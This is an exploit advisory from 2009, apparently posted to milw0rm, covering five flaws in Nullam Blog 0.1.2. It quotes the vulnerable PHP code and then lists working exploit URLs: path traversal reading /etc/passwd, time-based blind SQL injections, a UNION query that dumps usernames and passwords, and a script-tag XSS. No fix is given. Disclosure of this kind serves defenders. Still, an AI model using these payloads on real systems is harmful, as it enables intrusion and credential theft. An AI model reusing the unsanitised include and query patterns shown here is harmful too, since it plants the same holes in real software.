<html><head><title>Nullam Blog 0.1.2 (LFI/FD/SQL/XSS) Multiple Remote Vulnerabilities</title></head><pre>-- 
Salvatore Fresta aka drosophila
CWNP444351
******** Salvatore &quot;drosophila&quot; Fresta ********

[+] Application: Nullam Blog
[+] Version: 0.1.2
[+] Website: http://nullam.net/

[+] Bugs: [A] Local File Inclusion
[B] File Disclosure
[C] Multiple Blind SQL Injection
[D] SQL Injection
[E] Reflected XSS

[+] Exploitation: Remote
[+] Date: 10 Sep 2009

[+] Discovered by: Salvatore Fresta aka drosophila
[+] Author: Salvatore Fresta aka drosophila
[+] E-mail: drosophilaxxx [at] gmail.com

***************************************************

[+] Menu

1) Bugs
2) Code
3) Fix

***************************************************

[+] Bugs

The following flaws are tested on version 0.1.2.
Other versions may also be affected.

- [A] Local File Inclusion

[-] Risk: high
[-] File affected: index.php

This bug allows a guest to include a local file.

...

$static = false;

if(!isset($_GET['p'])) {

$include = &quot;./pages/news.php&quot;;

} else {

$include = &quot;./pages/&quot; . $_GET['p'] . &quot;.php&quot;;

}

...

if(!$static) {
include($include);
}

...

- [B] File Disclosure

[-] Risk: medium
[-] File affected: index.php

This bug allows a guest to view the content of a
local file.

...

if(isset($_GET['s'])) {
$static = true;
$include = &quot;./pages/custom/&quot; . $_GET['s'] . &quot;.html&quot;;
}

...

if(!$static) {
include($include);
} else {
$pageSmarty = new Smarty;
$pageSmarty-&gt;assign('html', file_get_contents($include));

...

- [C] Blind SQL Injection

[-] Risk: medium
[-] File affected: news.php, register.php

These bugs allows a guest to inject SQL statements
into the affected queries.

- [D] SQL Injection

[-] Risk: high
[-] File affected: register.php

This bug allows a guest to inject SQL statements
into the affected query.

...

$result = mysql_query(sprintf(&quot;SELECT `uname`,`verified` FROM `users` WHERE `verifyHash`='%s' LIMIT 1;&quot;, $_GET['v'])) or die(mysql_error());
if(mysql_numrows($result) != 1) {
$msg = &quot;Invalid verification hash! If you followed the link you received in your email please contact an admin and request a new verification email.&quot;;
} else {
$msg = &quot;User &quot; . mysql_result($result, 0, 'uname') . &quot; successfully verified! you may now login using the form on the main page!&quot;;
}

...

***************************************************

[+] Code

- [A] Local File Inclusion

http://site/path/index.php?p=../../../../../../etc/passwd%00

- [B] File Disclosure

http://site/path/index.php?s=../../../../../../../etc/passwd%00

- [C] Multiple Blind SQL Injection

http://site/path/index.php?y=1&amp;i=%25-1%25' OR IF(ASCII(CHAR(97)) = 97,BENCHMARK(10000000000,null),null)%23

http://site/path/index.php?p=register&amp;v=1' OR IF(ASCII(CHAR(97)) = 97,BENCHMARK(10000000000,null),null)%23

- [D] SQL Injection

http://site/path/index.php?p=register&amp;v=-1' UNION ALL SELECT GROUP_CONCAT(uname,0x3a,passwd),2 FROM users%23

- [E] Reflected XSS

http://site/path/index.php?p=error&amp;e=&lt;script&gt;alert('XSS');&lt;/script&gt;

***************************************************

[+] Fix

No fix.

***************************************************

# milw0rm.com [2009-09-10]</pre></html>